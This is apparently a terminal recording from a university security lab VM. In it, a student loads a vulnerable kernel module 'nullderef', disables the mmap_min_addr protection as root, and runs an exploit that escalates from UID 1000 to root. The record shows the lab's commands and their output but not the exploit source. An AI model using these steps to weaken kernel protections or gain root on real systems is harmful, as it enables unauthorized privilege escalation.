@@ -1,0 +1,60 @@
+Script started on Tue 21 Apr 2020 04:00:15 PM CDT
+[01;32mcs456@cs456vm[00m:[01;34m~/Desktop[00m$ cd nullderef/
+[01;32mcs456@cs456vm[00m:[01;34m~/Desktop/nullderef[00m$ sudo insmod nullderef.ko
+[sudo] password for cs456: 
+[01;32mcs456@cs456vm[00m:[01;34m~/Desktop/nullderef[00m$ lsmod | less
+Module                  Size  Used by
+nullderef              12357  0 
+loop                   17810  0 
+joydev                 17010  0 
+usbhid                 31554  0 
+hid                    64284  1 usbhid
+snd_intel8x0           22372  0 
+snd_ac97_codec         84236  1 snd_intel8x0
+snd_pcm                53461  2 snd_ac97_codec,snd_intel8x0
+snd_page_alloc         12867  2 snd_pcm,snd_intel8x0
+snd_timer              22356  1 snd_pcm
+ohci_hcd               22059  0 
+snd                    42761  4 snd_timer,snd_pcm,snd_ac97_codec,snd_intel8x0
+ehci_hcd               39631  0 
+psmouse                59658  0 
+sg                     21476  0 
+sr_mod                 17468  0 
+cdrom                  34813  1 sr_mod
+crc32c_intel           12659  0 
+soundcore              12921  1 snd
+ata_generic            12439  0 
+i2c_piix4              12480  0 
+ac                     12552  0 
+ac97_bus               12462  1 snd_ac97_codec
+:[K[K[01;32mcs456@cs456vm[00m:[01;34m~/Desktop/nullderef[00m$ u[Ksudo -o[Ki
+root@cs456vm:~# echo 0 > /proc/sys/vm/mmap_min_addr
+root@cs456vm:~# cat[K[K[Kecho 0 > /proc/sys/vm/mmap_min_addr[C[C[C[C[1P/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cc/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cc/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ca/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ct/proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C /proc/sys/vm/mmap_min_addr[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+0
+root@cs456vm:~# logout
+[01;32mcs456@cs456vm[00m:[01;34m~/Desktop/nullderef[00m$ ./exploit
+UID before: 1000
+UID after: 0
+# whoami
+root
+# fdisk
+Usage:
+ fdisk [options] <disk>    change partition table
+ fdisk [options] -l <disk> list partition table(s)
+ fdisk -s <partition>      give partition size(s) in blocks
+
+Options:
+ -b <size>             sector size (512, 1024, 2048 or 4096)
+ -c[=<mode>]           compatible mode: 'dos' or 'nondos' (default)
+ -h                    print this help text
+ -u[=<unit>]           display units: 'cylinders' or 'sectors' (default)
+ -v                    print program version
+ -C <number>           specify the number of cylinders
+ -H <number>           specify the number of heads
+ -S <number>           specify the number of sectors per track
+
+# 
+[01;32mcs456@cs456vm[00m:[01;34m~/Desktop/nullderef[00m$ exit
+exit
+
+Script done on Tue 21 Apr 2020 04:01:39 PM CDT
